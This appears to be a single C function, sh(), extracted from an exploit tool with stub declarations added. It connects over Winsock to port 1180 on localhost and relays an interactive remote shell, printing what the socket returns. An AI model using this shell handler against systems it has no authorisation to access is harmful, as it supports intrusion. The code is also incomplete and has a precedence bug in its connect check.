
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct in_addr {int dummy; } ;
struct sockaddr_in {int sin_family; struct in_addr sin_addr; int sin_port; } ;
struct sockaddr {int dummy; } ;
typedef int fd_set ;
typedef int WSADATA ;


 int CreateThread (int ,int ,void*,long*,int ,int ) ;
 scalar_t__ FD_ISSET (long,int *) ;
 int FD_SET (long,int *) ;
 int FD_ZERO (int *) ;
 int WSAStartup (int,int *) ;
 scalar_t__ client2serv ;
 scalar_t__ connect (long,struct sockaddr*,int) ;
 int fatal (char*) ;
 int htons (int) ;
 int memset (char*,int ,int) ;
 int printf (char*,...) ;
 int recv (long,char*,int,int ) ;
 scalar_t__ select (long,int *,int *,int *,int *) ;
 long socket (int,int,int) ;

void sh() {
 int ret;
 long s;
 WSADATA wsa;
 struct sockaddr_in sin;
 char buff[4096];
 fd_set fds;
 long host=0x0100007f;

 WSAStartup(0x202,&wsa);

 sin.sin_family=2;
 sin.sin_port=htons(1180);
 sin.sin_addr = *(struct in_addr *)&host;

 s=socket(2,1,6);
 if ( ret=connect(s,(struct sockaddr *)&sin,16) != 0) {
  fatal("[-] damn.. it looks like it failed\n");
 } else
  printf("[+] connected.\n\n");

 CreateThread(0,0,(void *)client2serv,(long *)s,0,0);

 for (;;) {
  FD_ZERO(&fds);
  FD_SET(s,&fds);

        if (select(s+1, &fds, ((void*)0), ((void*)0), ((void*)0)) < 0)
   fatal("[-] shell.select()");

  if (FD_ISSET(s,&fds)) {
   if ( (ret = recv(s,buff,4096,0)) < 1 )
    fatal("[-] shell.recv()");
   memset(buff+ret,0,1);
   printf("%s",buff);
  }
 }

}
